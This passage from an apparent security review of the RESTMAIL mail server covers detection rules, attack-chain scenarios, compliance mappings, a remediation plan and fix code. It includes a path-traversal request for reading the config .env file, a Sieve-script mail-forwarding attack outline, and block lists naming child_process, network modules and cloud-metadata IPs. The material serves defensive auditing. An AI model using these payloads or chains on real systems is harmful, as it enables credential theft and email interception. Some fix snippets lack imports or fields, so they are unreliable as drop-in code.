| 7. RESTMAIL Unauthenticated Injection | Critical | 9.1 | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N |
| 8. SQL Injection | Critical | 8.5 | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:L |
| 9. SSRF Webhook Filter | Critical | 9.1 | CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N |
| 10. JS Sidecar RCE Test Endpoints | Critical | 9.9 | CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H |
| 11. Hardcoded Internal Service URL | Critical | 8.2 | CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N |
| 12. Sieve Script Path Traversal | Critical | 8.1 | CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N |
| 13. Pipeline Domain Authorization | Critical | 8.5 | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N |

### Exploit Difficulty Assessment

| Difficulty | Issues | Description |
|------------|--------|-------------|
| **Trivial** | 1, 2, 5, 7 | Can exploit with curl/browser, no authentication needed |
| **Easy** | 3, 6, 10, 13 | Requires valid credentials but no technical skill |
| **Moderate** | 4, 8, 9, 11, 12 | Requires understanding of filters/pipelines |
| **Hard** | - | Would require chaining multiple bugs |

---

## Detection Strategies

### For Issue #1 (Hardcoded Credentials)
```bash
# Monitor for default credential usage
grep -E "(admin123|password123|dev-secret)" /var/log/restmail/auth.log

# Alert on first-login with seeded credentials
# Track accounts that haven't changed default passwords
```

### For Issue #4 (JavaScript RCE)
```bash
# Monitor for suspicious JS filter patterns
grep -E "(child_process|fs\.|net\.|http\.|https\.)" /var/log/restmail/js-filter.log

# Alert on outbound connections from js-filter container
# Monitor CPU/memory spikes in js-filter sidecar
```

### For Issue #9 (SSRF via Webhook)
```bash
# Log all webhook URLs and alert on internal IPs
grep -E "(169\.254|10\.|192\.168|172\.(1[6-9]|2[0-9]|3[01]))" /var/log/restmail/webhook.log

# Monitor for metadata service access
# Alert on unusual response sizes from webhooks
```

### For Issue #13 (Cross-Tenant Access)
```sql
-- Detect anomalous domain access patterns
SELECT admin_id, domain_id, COUNT(*) 
FROM pipeline_logs 
WHERE created_at > NOW() - INTERVAL '1 hour'
GROUP BY admin_id, domain_id
HAVING COUNT(DISTINCT domain_id) > 5;
```

---

## Additional Attack Chains

### Scenario 4: Privilege Escalation via Stats Endpoint

**Prerequisites:** None (unauthenticated)

**Steps:**
1. Access `/metrics` to gather system information
2. Identify high-value targets from metrics labels
3. Use version info to find known CVEs
4. Exploit Issue #7 (RESTMAIL injection) to send phishing
5. Harvest admin credentials from fake login portal
6. Chain into Scenario 1 or 2

**Impact:** Information gathering → Account compromise → Full breach

### Scenario 5: Path Traversal to Config Theft

**Prerequisites:** Valid session cookie

**Steps:**
1. Access attachment endpoint: `GET /api/v1/attachments/..%2f..%2fconfig%2f.env`
2. Extract database credentials from config
3. Direct database access if exposed
4. Or use credentials in API client configuration
5. Modify pipeline to exfiltrate all emails

**Impact:** Config exposure → Database access → Data breach

### Scenario 6: SMTP Gateway Takeover

**Prerequisites:** Valid mailbox credentials

**Steps:**
1. Authenticate to SMTP gateway
2. Send email with malicious Sieve script attachment
3. Sieve script auto-installs via auto-responder
4. Script forwards all incoming emails to attacker
5. Script persists across password changes

**Impact:** Persistent email interception without ongoing access

---

## Compliance Framework Mapping

### SOC 2 Type II

| Control | Affected Issues | Status |
|---------|-----------------|--------|
| CC6.1 Logical access security | 1, 3, 6, 13 | **FAIL** |
| CC6.2 Prior to access | 2, 12 | **FAIL** |
| CC6.3 Access removal | N/A | Need to verify |
| CC6.6 Encryption | 29 | **PARTIAL** |
| CC7.2 System monitoring | 17, 26 | **FAIL** |

### ISO 27001:2022

| Control | Affected Issues | Annex A Reference |
|---------|-----------------|-------------------|
| A.5.15 Access control | 1, 3, 6, 13 | 5.15, 5.16, 5.18 |
| A.5.23 Web filtering | 9 | 5.23 |
| A.5.28 Secure coding | 4, 5, 8, 10 | 5.28, 8.25 |
| A.8.9 Configuration management | 1, 11 | 8.9 |
| A.8.11 Data masking | 27 | 8.11 |

### GDPR

| Principle | Violation Risk | Affected Issues |
|-----------|---------------|-----------------|
| Article 5(1)(f) Security | **HIGH** | 1, 3, 4, 6, 9, 10, 13 |
| Article 25 Data protection by design | **MEDIUM** | 14, 17, 19, 28 |
| Article 32 Security of processing | **HIGH** | 1, 11, 29 |
| Article 33 Breach notification | Requires audit logging | 26, 36 |

### PCI DSS (if handling card data in emails)

| Requirement | Status | Notes |
|-------------|--------|-------|
| 1.1.6 Strong cryptography | **FAIL** | Issue 11 (HTTP to sidecar) |
| 2.1 Default passwords | **FAIL** | Issue 1 |
| 6.5.1 SQL Injection | **FAIL** | Issue 8 |
| 6.5.2 XSS | **PARTIAL** | Need to verify webmail sanitization |
| 6.5.7 CSRF | **FAIL** | Issue 15 |
| 10.2 Audit trails | **FAIL** | Issue 26 |

---

## Prioritized Remediation Roadmap

### Week 1: Emergency Fixes (P0)

**Effort:** 2-3 developers, 40 hours total

| Issue | Task | Owner | Hours | Testing |
|-------|------|-------|-------|---------|
| 1 | Remove hardcoded passwords from compose | DevOps | 4 | Verify startup fails without env vars |
| 4 | Disable JS filter endpoints | Backend | 2 | Confirm 404 on /execute and /validate |
| 10 | Add mTLS between API and sidecar | Backend | 8 | Verify certificates required |
| 9 | Implement SSRF protection in webhook | Backend | 12 | Unit tests with 169.254.169.254 |
| 13 | Add domain authorization checks | Backend | 8 | Test cross-tenant access blocked |
| 7 | Add API key auth to RESTMAIL | Backend | 6 | Test without key returns 401 |

**Validation:**
```bash
# Automated tests
./scripts/verify-p0-fixes.sh
# Should output: All P0 issues resolved
```

### Week 2: Critical Security (P1)

**Effort:** 3 developers, 60 hours total

| Issue | Task | Owner | Hours |
|-------|------|-------|-------|
| 5 | Fix attachment path validation | Backend | 8 |
| 3 | Add mailbox handler authorization | Backend | 6 |
| 6 | Add attachment handler auth checks | Backend | 6 |
| 2 | Add auth to /metrics and /health | Backend | 4 |
| 17 | Implement rate limiting | Backend | 12 |
| 8 | Sanitize SQL LIKE patterns | Backend | 8 |
| 12 | Add Sieve path validation | Backend | 8 |
| 29 | Secure memory for TLS keys | Backend | 8 |

### Week 3: Hardening (P2)

**Effort:** 2 developers, 40 hours total

| Issue | Task | Owner | Hours |
|-------|------|-------|-------|
| 14 | Enforce strong JWT secrets | DevOps | 4 |
| 15 | Implement CSRF tokens | Frontend | 12 |
| 18 | Increase password requirements | Backend | 4 |
| 19 | Sanitize log output | Backend | 6 |
| 34 | Enable database TLS | DevOps | 8 |
| 37 | Add security headers | Backend | 6 |

### Week 4: Infrastructure & Monitoring (P3)

**Effort:** 2 developers + DevOps, 40 hours total

| Issue | Task | Owner | Hours |
|-------|------|-------|-------|
| All | Container security contexts | DevOps | 8 |
| All | Network policies | DevOps | 8 |
| 26 | Audit logging | Backend | 12 |
| All | Security scanning CI/CD | DevOps | 8 |
| 36 | PROXY protocol validation | Backend | 4 |

---

## Complete Code Fixes

### Fix for Issue #1: Docker Compose Secrets

```yaml
# docker-compose.yml - Production Version
version: '3.8'

services:
  api:
    image: restmail/api:latest
    environment:
      # Use Docker secrets or external vault
      JWT_SECRET_FILE: /run/secrets/jwt_secret
      DB_PASSWORD_FILE: /run/secrets/db_password
    secrets:
      - jwt_secret
      - db_password
    # Never pass secrets as plain env vars
    
  # Remove all hardcoded passwords from environment sections
  
secrets:
  jwt_secret:
    external: true  # Managed by Docker Swarm or external secret store
  db_password:
    external: true
```

### Fix for Issue #4 & #10: Sandboxed JavaScript Filter

```javascript
// sidecar/filter.js - Secure Implementation
const ivm = require('isolated-vm');
const crypto = require('crypto');

class SecureFilter {
    constructor() {
        this.isolate = new ivm.Isolate({
            memoryLimit: 128,  // MB
            timeout: 5000       // 5 seconds
        });
    }

    async execute(script, email) {
        // Validate script against allowlist
        if (!this.isValidScript(script)) {
            throw new Error('Script contains forbidden operations');
        }

        const context = await this.isolate.createContext();
        
        // Expose ONLY safe globals
        const jail = context.global;
        await jail.set('email', new ivm.Reference(email));
        await jail.set('console', new ivm.Reference({
            log: (...args) => console.log('[FILTER]', ...args)
        }));

        // NO access to: require, fs, net, http, process, etc.
        
        const scriptObj = await this.isolate.compileScript(`
            (function() {
                ${script}
            })()
        `);
        
        return await scriptObj.run(context, { timeout: 5000 });
    }

    isValidScript(script) {
        const forbidden = [
            /require\s*\(/,
            /child_process/,
            /fs\./,
            /net\./,
            /http\./,
            /https\./,
            /process\./,
            /eval\s*\(/,
            /Function\s*\(/,
            /import\s+/
        ];
        return !forbidden.some(pattern => pattern.test(script));
    }
}

module.exports = SecureFilter;
```

### Fix for Issue #9: SSRF Protection

```go
// internal/pipeline/filters/webhook.go
package filters

import (
    "fmt"
    "net"
    "net/url"
    "regexp"
)

type SSRFProtector struct {
    blockedHosts []string
    blockedIPs   []*net.IPNet
}

func NewSSRFProtector() *SSRFProtector {
    s := &SSRFProtector{
        blockedHosts: []string{
            "localhost",
            "169.254.169.254",  // AWS metadata
            "metadata.google.internal",
        },
    }
    
    // Block private IP ranges
    privateCIDRs := []string{
        "10.0.0.0/8",
        "172.16.0.0/12",
        "192.168.0.0/16",
        "127.0.0.0/8",
        "169.254.0.0/16",
        "fc00::/7",
    }
    
    for _, cidr := range privateCIDRs {
        _, ipnet, _ := net.ParseCIDR(cidr)
        s.blockedIPs = append(s.blockedIPs, ipnet)
    }
    
    return s
}

func (s *SSRFProtector) ValidateURL(urlStr string) error {
    u, err := url.Parse(urlStr)
    if err != nil {
        return fmt.Errorf("invalid URL: %w", err)
    }
    
    // Enforce HTTPS only
    if u.Scheme != "https" {
        return fmt.Errorf("only HTTPS URLs allowed")
    }
    
    host := u.Hostname()
    
    // Check blocked hosts
    for _, blocked := range s.blockedHosts {
        if host == blocked {
            return fmt.Errorf("host %s is blocked", host)
        }
    }
    
    // Check if hostname is IP
    if ip := net.ParseIP(host); ip != nil {
        if s.isBlockedIP(ip) {
            return fmt.Errorf("IP %s is in blocked range", ip)
        }
        return nil
    }
    
    // Resolve and check all IPs
    addrs, err := net.LookupIP(host)
    if err != nil {
        return fmt.Errorf("DNS lookup failed: %w", err)
    }
    
    for _, addr := range addrs {
        if s.isBlockedIP(addr) {
            return fmt.Errorf("hostname resolves to blocked IP %s", addr)
        }
    }
    
    return nil
}

func (s *SSRFProtector) isBlockedIP(ip net.IP) bool {
    for _, ipnet := range s.blockedIPs {
        if ipnet.Contains(ip) {
            return true
        }
    }
    return false
}
```

### Fix for Issue #13: Domain Authorization Middleware

```go
// internal/api/middleware/domain_auth.go
package middleware

import (
    "net/http"
    "strconv"
    
    "github.com/restmail/internal/auth"
    "github.com/restmail/internal/db/models"
    "github.com/restmail/internal/api/respond"
    "gorm.io/gorm"
)

type DomainAuth struct {
    db *gorm.DB
}

func NewDomainAuth(db *gorm.DB) *DomainAuth {
    return &DomainAuth{db: db}
}

// RequireDomainAccess checks if user has access to the specified domain
func (da *DomainAuth) RequireDomainAccess(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        claims := auth.GetClaims(r)
        if claims.IsSuperAdmin {
            next.ServeHTTP(w, r)
            return
        }
        
        // Get domain_id from query or path
        domainIDStr := r.URL.Query().Get("domain_id")
        if domainIDStr == "" {
            // Try to get from URL param
            domainIDStr = chi.URLParam(r, "domainID")
        }
        
        if domainIDStr == "" {
            next.ServeHTTP(w, r)
            return
        }
        
        domainID, err := strconv.ParseUint(domainIDStr, 10, 64)
        if err != nil {
            respond.Error(w, http.StatusBadRequest, "invalid_domain", "Invalid domain ID")
            return
        }
        
        // Verify user owns this domain
        var domain models.Domain
        result := da.db.Where("id = ? AND admin_id = ?", domainID, claims.UserID).First(&domain)
        if result.Error != nil {
            respond.Error(w, http.StatusForbidden, "forbidden", "Access denied to domain")
            return
        }
        
        next.ServeHTTP(w, r)
    })
}
```

### Fix for Issue #5 & #6: Safe Attachment Handling

```go
// internal/api/handlers/attachments.go
package handlers

import (
    "fmt"
    "io"
    "net/http"
    "os"
    "path/filepath"
    "strings"
)

type AttachmentHandler struct {
    basePath string
}

// getSafePath validates and returns a safe file path
func (h *AttachmentHandler) getSafePath(userID uint, filename string) (string, error) {
    // Sanitize filename - remove any path components
    safeName := filepath.Base(filename)
    
    // Check for null bytes or other suspicious patterns
    if strings.ContainsAny(safeName, "\x00\x01\x02\x03\x04\x05") {
        return "", fmt.Errorf("invalid filename")
    }
    
    // Build absolute path
    baseAbs, err := filepath.Abs(h.basePath)
    if err != nil {
        return "", err
    }
    
    userDir := filepath.Join(baseAbs, fmt.Sprintf("user_%d", userID))
    finalPath := filepath.Join(userDir, safeName)
    
    // Verify path is within user directory (CRITICAL CHECK)
    finalAbs, err := filepath.Abs(finalPath)
    if err != nil {
        return "", err
    }
    
    if !strings.HasPrefix(finalAbs, userDir+string(filepath.Separator)) && 
       finalAbs != userDir {
        return "", fmt.Errorf("path traversal detected")
    }
    
    return finalAbs, nil
}

func (h *AttachmentHandler) ServeAttachment(w http.ResponseWriter, r *http.Request) {
    claims := auth.GetClaims(r)
    filename := chi.URLParam(r, "filename")
    
    // Get safe path
    safePath, err := h.getSafePath(claims.UserID, filename)
    if err != nil {
        respond.Error(w, http.StatusForbidden, "forbidden", "Invalid attachment")
        return
    }
    
    // Verify file exists and is regular file
    info, err := os.Stat(safePath)
    if err != nil || info.IsDir() {
        respond.Error(w, http.StatusNotFound, "not_found", "Attachment not found")
        return
    }
    
    // Additional ownership check via database
    var attachment models.Attachment
    if err := h.db.Where("filename = ? AND owner_id = ?", filename, claims.UserID).First(&attachment).Error; err != nil {
        respond.Error(w, http.StatusForbidden, "forbidden", "Access denied")
        return
    }
    
    // Serve file with content-type detection
    contentType := detectContentType(safePath)
    w.Header().Set("Content-Type", contentType)
    w.Header().Set("X-Content-Type-Options", "nosniff")
    
    http.ServeFile(w, r, safePath)
}
```

### Fix for Issue #17: Rate Limiting Middleware

```go
// internal/api/middleware/ratelimit.go
package middleware

import (
    "net/http"
    "sync"
    "time"
    
    "golang.org/x/time/rate"
)

type RateLimiter struct {
    visitors map[string]*rate.Limiter
    mu       sync.RWMutex
    cleanup  time.Duration
}

func NewRateLimiter() *RateLimiter {
    rl := &RateLimiter{
        visitors: make(map[string]*rate.Limiter),
        cleanup:  time.Hour,
    }
    go rl.cleanupOldEntries()
    return rl
}

func (rl *RateLimiter) getLimiter(key string, r rate.Limit, b int) *rate.Limiter {
    rl.mu.Lock()
    defer rl.mu.Unlock()
    
    limiter, exists := rl.visitors[key]
    if !exists {
        limiter = rate.NewLimiter(r, b)
        rl.visitors[key] = limiter
    }
    return limiter
}

func (rl *RateLimiter) LoginRateLimit(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        // Per-IP limit: 5 attempts per minute
        ip := getClientIP(r)
        limiter := rl.getLimiter(ip, rate.Every(time.Minute/5), 5)
        
        if !limiter.Allow() {
            w.Header().Set("Retry-After", "60")
            http.Error(w, "Too many login attempts", http.StatusTooManyRequests)
            return
        }
        
        next.ServeHTTP(w, r)
    })
}

func (rl *RateLimiter) APICostLimit(cost int) func(http.Handler) http.Handler {
    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            claims := auth.GetClaims(r)
            key := fmt.Sprintf("api_cost:%d", claims.UserID)
            limiter := rl.getLimiter(key, rate.Every(time.Second), 100) // 100 tokens per second
            
            if !limiter.AllowN(time.Now(), cost) {
                http.Error(w, "Rate limit exceeded", http.StatusTooManyRequests)
                return
            }
            
            next.ServeHTTP(w, r)
        })
    }
}
```

---

*This review was conducted using static code analysis. Dynamic testing and penetration testing are recommended for comprehensive security validation.*
